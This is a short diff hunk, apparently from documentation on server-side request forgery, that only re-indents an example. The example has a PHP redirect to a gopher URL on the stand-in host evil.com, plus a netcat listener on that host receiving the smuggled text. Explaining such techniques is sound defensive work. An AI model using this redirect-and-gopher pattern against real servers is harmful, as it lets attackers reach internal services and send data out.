@@ -155,9 +155,9 @@ It is an application protocol used over an IP network to manage and access the d
     header('Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest');
     ?>
 
-   evil.com:# nc -lvp 1337
-   Listening on [0.0.0.0] (family 0, port 1337)
+    evil.com:# nc -lvp 1337
+    Listening on [0.0.0.0] (family 0, port 1337)
     Connection from [192.168.0.12] port 1337 [tcp/*] accepted (family 2, sport 49398) 
-   Hi
-  ssrf
-  test
+    Hi
+    ssrf
+    test
